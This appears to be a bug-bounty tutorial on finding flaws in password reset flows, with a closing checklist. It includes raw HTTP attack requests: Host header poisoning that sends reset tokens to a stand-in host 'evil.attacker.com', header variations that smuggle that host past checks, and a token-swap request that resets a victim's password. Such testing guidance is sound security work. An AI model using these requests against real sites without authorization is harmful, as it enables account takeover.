Password Reset
Password reset is one of the most consistently rewarded bug classes in bug bounty. The flow involves tokens, emails, redirects, and external domains  -  that's a lot of surface area for things to go wrong. I come back to this on every target.
Token Leakage via Referer
When a reset link lands on a page that loads third-party resources (analytics, fonts, ads), the full URL  -  including the token  -  gets sent as the Referer header to every external domain.
How to test: Trigger a password reset, click the link, and capture outgoing requests in Burp. Look for the reset token appearing in Referer headers on requests to Google Analytics, Segment, Intercom, etc.
GET /track?event=page_view HTTP/1.1
Host: analytics.example.com
Referer: target.com/reset
This is consistently P2/P3 depending on the program.
Host Header Poisoning
Classic and still works on a surprising number of targets. The app uses the Host header to construct the reset URL in the email. Poison it to point to your server.
POST /forgot-password HTTP/1.1
Host: evil.attacker.com
Content-Type: application/x-www-form-urlencoded
 
email=victim@target.com
If the app doesn't validate the host, the victim receives an email with a reset link pointing to evil.attacker.com. Token exfiltrated.
Variations to try:
Host: target.com
X-Forwarded-Host: evil.attacker.com
 
Host: target.com:@evil.attacker.com
 
Host: evil.attacker.com#target.com
Burp's "Host header injection" scan catches some of these but manual testing catches more.
Token Predictability
Weak tokens are rare on modern frameworks but still appear on legacy apps and custom-built reset flows.

Grab 10+ reset tokens in quick succession from accounts you control
Look for sequential or time-based patterns
Check if the token is an MD5/SHA1 of the email address or timestamp: md5(email + timestamp) is a classic failure
Token length matters  -  anything under 16 hex chars deserves scrutiny

# Collect tokens, look for patterns
echo "token1: a3f2..."
echo "token2: a3f3..."  # incrementing? bad.
Reset Flow Logic Bugs
Token reuse  -  does the token get invalidated after use? Try reusing a consumed token an hour later.
Token not bound to account  -  generate a reset token for attacker@attacker.com, then modify the email parameter on the reset form submission to victim@target.com. If the app only validates the token and not the account it was issued to  -  you win.
POST /reset-password HTTP/1.1
Host: target.com
 
token=ATTACKER_TOKEN&email=victim@target.com&new_password=hacked123
No token expiry  -  tokens that never expire are a lower severity but still valid. Some programs pay for it.
Race condition on reset  -  send two simultaneous requests to consume the same token. If both succeed, there's a TOCTOU issue. Usually chained with something else.
User enumeration  -  "Email sent if account exists" is fine. "No account found with that email" is user enumeration. Some programs care, some don't.

Checklist

 Referer leakage to third-party scripts on the reset landing page
 Host header manipulation  -  does the reset email use your injected host?
 Token reuse after consumption
 Token bound to specific account or just valid globally?
 Token entropy  -  collect 10 tokens and compare
 Token expiry  -  try a 24h old token
 User enumeration via response differences
